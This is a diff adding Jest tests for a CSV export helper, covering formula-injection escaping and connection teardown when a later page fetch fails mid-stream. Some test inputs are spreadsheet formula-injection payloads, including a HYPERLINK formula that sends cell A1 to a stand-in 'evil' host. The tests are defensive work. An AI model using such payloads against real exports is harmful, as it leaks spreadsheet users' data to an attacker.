@@ -36,6 +36,57 @@ describe("csvEscapeField", () => {
     expect(escaped.startsWith('"')).toBe(true);
     expect(escaped.endsWith('"')).toBe(true);
   });
+
+  describe("[Fix round, Important 6] formula-injection defense", () => {
+    it.each([
+      [
+        '=HYPERLINK("http://evil/"&A1,"Click")',
+        '\'=HYPERLINK("http://evil/"&A1,"Click")',
+      ],
+      ["+1+1", "'+1+1"],
+      ["-1+1", "'-1+1"],
+      ["@SUM(1,1)", "'@SUM(1,1)"],
+      ["\tsneaky", "'\tsneaky"],
+      ["\rsneaky", "'\rsneaky"],
+    ])(
+      "prefixes a leading formula-trigger character %p with a single quote",
+      (input, expectedPrefixed) => {
+        // The =HYPERLINK example also contains commas/quotes, so the
+        // FINAL output is additionally RFC-4180-wrapped — assert the
+        // prefix landed by checking the wrapped/unwrapped value contains
+        // the single-quote-prefixed string, not exact equality for that
+        // one case.
+        const escaped = csvEscapeField(input);
+        if (/[",\r\n]/.test(expectedPrefixed)) {
+          expect(escaped).toContain("'");
+          expect(escaped.replace(/^"|"$/g, "").replace(/""/g, '"')).toBe(
+            expectedPrefixed,
+          );
+        } else {
+          expect(escaped).toBe(expectedPrefixed);
+        }
+      },
+    );
+
+    it("a legalName like =HYPERLINK(...) round-trips as inert literal text, never a live formula", () => {
+      const merchantLegalName = '=HYPERLINK("http://evil.test/"&A1,"Click me")';
+      const escaped = csvEscapeField(merchantLegalName);
+      // Must start with a quoted apostrophe-prefixed value — Excel/Sheets
+      // render a leading `'` as "this cell is text", never evaluating
+      // whatever follows as a formula.
+      expect(escaped.startsWith("\"'")).toBe(true);
+    });
+
+    it("does NOT touch a value that merely CONTAINS = / + / - / @ later in the string", () => {
+      expect(csvEscapeField("total=5")).toBe("total=5");
+      expect(csvEscapeField("a+b")).toBe("a+b");
+      expect(csvEscapeField("user@example.com")).toBe("user@example.com");
+    });
+
+    it("a negative NUMBER is still prefixed — deliberately unconditional, see csv.util.ts's doc comment (OWASP's own guidance; moot here since no export field is ever negative)", () => {
+      expect(csvEscapeField(-500)).toBe("'-500");
+    });
+  });
 });
 
 describe("csvRow", () => {
@@ -55,6 +106,7 @@ describe("streamCsv", () => {
         return true;
       }),
       end: jest.fn(),
+      destroy: jest.fn(),
     };
   }
 
@@ -145,5 +197,79 @@ describe("streamCsv", () => {
     expect(res.chunks.join("")).toBe("id\r\n");
     expect(fetchPage).toHaveBeenCalledTimes(1);
     expect(res.end).toHaveBeenCalledTimes(1);
+  });
+
+  describe("[Fix round, Minor] mid-stream fetchPage failure", () => {
+    it("destroys the connection instead of silently ending it when a LATER page's fetch throws", async () => {
+      const res = fakeResponse();
+      const dbError = new Error("connection terminated unexpectedly");
+      const fetchPage = jest
+        .fn()
+        // First page: header is already flushed by the time this
+        // resolves, and this page's own rows get written too — proving
+        // the failure genuinely happens AFTER real data already went out
+        // (a truncation, not an empty response).
+        .mockResolvedValueOnce([{ id: 1 }, { id: 2 }])
+        .mockRejectedValueOnce(dbError);
+
+      await streamCsv(
+        res as any,
+        "export.csv",
+        ["id"],
+        fetchPage,
+        (item: { id: number }) => [item.id],
+        2,
+      );
+
+      // The header and first page's rows genuinely reached the client
+      // before the failure — this is exactly the "looks complete so far"
+      // trap the fix defends against.
+      expect(res.chunks.join("")).toBe("id\r\n1\r\n2\r\n");
+
+      // The connection is forcibly reset, carrying the real error...
+      expect(res.destroy).toHaveBeenCalledTimes(1);
+      expect(res.destroy).toHaveBeenCalledWith(dbError);
+
+      // ...and NOT cleanly ended — a clean res.end() is exactly what
+      // would make a truncated body indistinguishable from a complete
+      // one to a client that isn't strictly checking the chunked
+      // trailer.
+      expect(res.end).not.toHaveBeenCalled();
+    });
+
+    it("resolves rather than rejecting — a mid-stream failure must not become an unhandled promise rejection at the controller's `await streamCsv(...)` call site", async () => {
+      const res = fakeResponse();
+      const fetchPage = jest
+        .fn()
+        .mockResolvedValueOnce([{ id: 1 }])
+        .mockRejectedValueOnce(new Error("boom"));
+
+      await expect(
+        streamCsv(
+          res as any,
+          "x.csv",
+          ["id"],
+          fetchPage,
+          (item: any) => [item.id],
+          1,
+        ),
+      ).resolves.toBeUndefined();
+    });
+
+    it("wraps a non-Error rejection (e.g. a thrown string) in an Error before destroying the connection", async () => {
+      const res = fakeResponse();
+      const fetchPage = jest
+        .fn()
+        .mockRejectedValueOnce("plain string rejection");
+
+      await streamCsv(res as any, "x.csv", ["id"], fetchPage, (item: any) => [
+        item.id,
+      ]);
+
+      expect(res.destroy).toHaveBeenCalledTimes(1);
+      const passedArg = res.destroy.mock.calls[0][0];
+      expect(passedArg).toBeInstanceOf(Error);
+      expect(passedArg.message).toBe("plain string rejection");
+    });
   });
 });
